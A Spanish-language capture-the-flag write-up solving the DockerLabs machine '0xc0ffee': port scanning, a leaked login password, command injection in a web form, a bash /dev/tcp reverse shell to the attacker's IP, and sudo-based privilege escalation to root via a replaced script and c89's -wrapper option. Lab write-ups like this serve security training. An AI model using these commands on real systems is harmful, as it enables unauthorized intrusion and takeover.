#MAQUINA #DOCKERLABS #MEDIO 
#RCE
<hr>

# RECONOCIMIENTO

Vamos a resolver **0xc0ffee** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 11:01 CET
Initiating ARP Ping Scan at 11:01
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 11:01, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:01
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 7777/tcp on 172.17.0.2
Completed SYN Stealth Scan at 11:01, 0.50s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-02-24 11:01:54 CET for 0s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack ttl 64
7777/tcp open  cbt     syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene los puertos **80(HTTP)** y el **7777** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,7777 172.17.0.2                   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 11:02 CET
Nmap scan report for 404-not-found.hl (172.17.0.2)
Host is up (0.000018s latency).

PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
7777/tcp open   http    SimpleHTTPServer 0.6 (Python 3.12.3)
|_http-title: Directory listing for /
|_http-server-header: SimpleHTTP/0.6 Python/3.12.3
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.36 seconds



```

```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 11:04 CET
Nmap scan report for 404-not-found.hl (172.17.0.2)
Host is up (0.0000040s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
7777/tcp open  cbt
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds

whatweb "http://172.17.0.2/"                                                                                                          
http://172.17.0.2/ [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[Security Verification Tool]

whatweb "http://172.17.0.2:7777/"                                                                                                          
http://172.17.0.2:7777/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[SimpleHTTP/0.6 Python/3.12.3], IP[172.17.0.2], Python[3.12.3], Title[Directory listing for /]


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## 7777

Vemos un directorio secret con un txt que tiene la contra del login del puerto 80 -> super_secure_password.


# EXPLOTACION

Al poner la contra, vemos un formulario.

Si ponemos un identificador, metemos un `echo "crack";` y luego buscamos la configuración, vemos que se ejecuta e interpreta.

Por lo que nos ponemos en escucha y nos damos una shell :

```bash

/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'

```

YA ESTAMOS COMO WWW-DATA.
# ESCALADA PRIVILEGIOS

Vemos un secreto en el home de codebad, una adivinanza.

**Contra -> malware**

YA ESTAMOS COMO CODEBAD.

Vemos si el usuario tiene permisos SUDO:
   ```bash
codebad@9c22d670afa8:~/secret$ sudo -l
Matching Defaults entries for codebad on 9c22d670afa8:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User codebad may run the following commands on 9c22d670afa8:
    (metadata : metadata) NOPASSWD: /home/codebad/code

```


Vemos **/home/codebad/code**  con permisos SUDO, como el directorio es nuestro lo borramos y creamos uno a nuestro gusto:

   ```bash
codebad@9c22d670afa8:~$ cat code
#!/bin/bash

bash -p
codebad@9c22d670afa8:~$ sudo -u metadata ./code ../metadata/pass.txt
metadata@9c22d670afa8:/home/codebad$ whoami
metadata
metadata@9c22d670afa8:/home/codebad$ 


```

YA ESTAMOS COMO METADATA.

Si buscamos un poco, vemos que en /usr/local/bin hay un archivo **metadatosmalos**. No podemos hacer nada, pero si probamos como contra de metadata, podemos hacer el sudo -l .

Vemos **c89**  con permisos SUDO:

```bash
metadata@9c22d670afa8:/usr/local/bin$ 

    sudo c89 -wrapper /bin/sh,-s .

# whoami
root
# 


```

**YA ESTAMOS COMO ROOT.**